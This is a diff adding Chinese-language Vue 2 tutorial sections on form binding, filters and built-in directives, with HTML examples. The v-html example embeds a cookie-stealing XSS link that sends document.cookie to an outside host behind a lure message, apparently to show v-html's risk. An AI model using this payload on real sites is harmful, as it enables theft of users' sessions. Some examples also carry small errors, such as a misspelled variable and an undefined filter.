@@ -537,6 +537,8 @@ vue提供的更通用的方式来观察和响应vue实例上的数据变动就�
 
 # 收集数据
 
+数据收集主要靠`v-model`进行收集，可以通过一些修饰符
+
 ```html
 <!DOCTYPE html>
 <html lang="zh-CN">
@@ -548,19 +550,19 @@ vue提供的更通用的方式来观察和响应vue实例上的数据变动就�
 </head>
 <body>
     <!-- 
-			收集表单数据：
-					若：<input type="text"/>，则v-model收集的是value值，用户输入的就是value值。
-					若：<input type="radio"/>，则v-model收集的是value值，且要给标签配置value值。
-					若：<input type="checkbox"/>
-							1.没有配置input的value属性，那么收集的就是checked（勾选 or 未勾选，是布尔值）
-							2.配置input的value属性:
-									(1)v-model的初始值是非数组，那么收集的就是checked（勾选 or 未勾选，是布尔值）
-									(2)v-model的初始值是数组，那么收集的的就是value组成的数组
-					备注：v-model的三个修饰符：
-									lazy：失去焦点再收集数据
-									number：输入字符串转为有效的数字
-									trim：输入首尾空格过滤
-		-->
+            收集表单数据：
+                    若：<input type="text"/>，则v-model收集的是value值，用户输入的就是value值。
+                    若：<input type="radio"/>，则v-model收集的是value值，且要给标签配置value值。
+                    若：<input type="checkbox"/>
+                            1.没有配置input的value属性，那么收集的就是checked（勾选 or 未勾选，是布尔值）
+                            2.配置input的value属性:
+                                    (1)v-model的初始值是非数组，那么收集的就是checked（勾选 or 未勾选，是布尔值）
+                                    (2)v-model的初始值是数组，那么收集的的就是value组成的数组
+                    备注：v-model的三个修饰符：
+                                    lazy：失去焦点再收集数据
+                                    number：输入字符串转为有效的数字
+                                    trim：输入首尾空格过滤
+        -->
     <div id="root">
         <form @submit.prevent="demo">
             账号：<input type="text" name="account" v-model.trim="userInfo.account"><br>
@@ -598,7 +600,7 @@ vue提供的更通用的方式来观察和响应vue实例上的数据变动就�
                     hobby: [],
                     city: '北京',
                     other:'',
-					agree:''
+                    agree:''
                 }
             },
             methods: {
@@ -606,6 +608,226 @@ vue提供的更通用的方式来观察和响应vue实例上的数据变动就�
                     console.log(JSON.stringify(this.userInfo))
                 }
             },
+        })
+    </script>
+</body>
+</html>
+```
+
+# 过滤器
+
+过滤器`filters`区别于`computed`、`methods`可以通过管道符传递数据，但并非必须使用。
+
+```html
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>过滤器</title>
+    <script src="../js/vue.js"></script>
+</head>
+<body>
+    <div id="root">
+        <input type="text" placeholder="请输入你的名字" v-model="name">
+        <h2>原数据：{{name}}</h2>
+        <!-- 通过计算属性实现 -->
+        <h2>computed后：{{computedName}}</h2>
+        <!-- 通过methods实现 -->
+        <h2>methods后：{{fmtName()}}</h2>
+        <!-- 通过过滤实现 -->
+        <h2>filters后：{{ name | capitalize | mySlice }}</h2>
+    </div>
+    <script>
+        const vm = new Vue({
+            el: '#root',
+            data: {
+                name: '',
+            },
+            computed: {
+                computedName: function() {
+                    val = this.name.toString()
+                    return val.charAt(0).toUpperCase() + val.slice(1)
+                }
+            },
+            methods: {
+                fmtName() {
+                    val = this.name.toString()
+                    return val.charAt(0).toUpperCase() + val.slice(1)
+                }
+            },
+            filters: {
+                capitalize: function(val) {
+                    val = val.toString()
+                    return val.charAt(0).toUpperCase() + val.slice(1)
+                }
+            }
+        })
+    </script>
+</body>
+</html>
+```
+
+# 内部指令
+
+### v-text
+
+`v-text`向其所在的节点中渲染文本内容，与插值语法的区别：v-text会替换掉节点中的内容，{{xx}}则不会。
+
+```html
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>v-text指令</title>
+    <script src="../js/vue.js"></script>
+</head>
+<body>
+    <div id="root">
+        <div>你好,{{name}}</div>
+        <div v-text="name"></div>
+        <div v-text="str"></div>
+    </div>
+    <script>
+        const vm = new Vue({
+            el: '#root',
+            data: {
+                name: 'shanla',
+                str: '<h2>shanla</h2>'
+            }
+        })
+    </script>
+</body>
+</html>
+```
+
+### v-html
+
+`v-html`用来更新元素的html，内容会按照普通html进行插入，不会作为Vue模板进行编译。
+
+```html
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>v-html指令</title>
+    <script src="../js/vue.js"></script>
+</head>
+<body>
+    <div id="root">
+        <div>你好，{{nmame}}</div>
+        <div v-html="str"></div>
+        <div v-html="str1"></div>
+    </div>
+    <script>
+        const vm = new Vue({
+            el: '#root',
+            data: {
+                name: 'shanla',
+                str: '<h3>你好啊！</h3>',
+                str1: '<a href=javascript:location.href="http://www.baidu.com?"+document.cookie>兄弟我找到你想要的资源了，快来！</a>',
+            }
+        })
+    </script>
+</body>
+</html>
+```
+
+### v-cloak
+
+有时候因为加载延时问题，例如卡掉了，数据没有及时刷新，就造成了页面显示从`{{name}}`到name变量“shanla”的变化，这样闪动的变化，会造成用户体验不好。
+
+此时需要使用到`v-cloak`的这个标签。在vue解析之前，div属性中有`v-cloak`这个标签，在vue解析完成之后，v-cloak标签被移除。简单，类似div开始有一个css属性`display:none;`，加载完成之后，css属性变成`display:block`，元素显示出来。
+
+```html
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>v-cloak指令</title>
+    <style>
+        [v-cloak] {
+            display: none;
+        }
+    </style>
+    <script src="../js/vue.js"></script>
+</head>
+<body>
+    <div id="root">
+        <h2 v-cloak>{{name}}</h2>
+    </div>
+    <script>
+        console.log(1)
+        new Vue({
+            el:'#root',
+            data:{
+                name:'shanla'
+            }
+        })
+    </script>
+</body>
+</html>
+```
+
+### v-once
+
+`v-once`只渲染元素和组件一次。
+
+```html
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>v-once</title>
+    <script src="../js/vue.js"></script>
+</head>
+<body>
+    <div id="root">
+        <h2 v-once>初始化的n值是:{{n}}</h2>
+        <h2>当前的n值是:{{n}}</h2>
+        <button @click="n++">点我+1</button>
+    </div>
+    <script>
+        const vm = new Vue({
+            el: '#root',
+            data: {
+                n: 0
+            }
+        })
+    </script>
+</body>
+</html>
+```
+
+### v-pre
+
+有时候我们需要直接输出{{n}}，不被vue解析，通过`v-pre`指令实现。
+
+```html
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>v-pre指令</title>
+    <script src="../js/vue.js"></script>
+</head>
+<body>
+    <div id="root">
+        <h2 v-pre>{{n}}</h2>
+        <h2 >当前的n值是:{{n}}</h2>
+        <button @click="n++">点我n+1</button>
+    </div>
+    <script>
+        const vm = new Vue({
+            el: '#root',
+            data: {
+                n: 1
+            }
         })
     </script>
 </body>
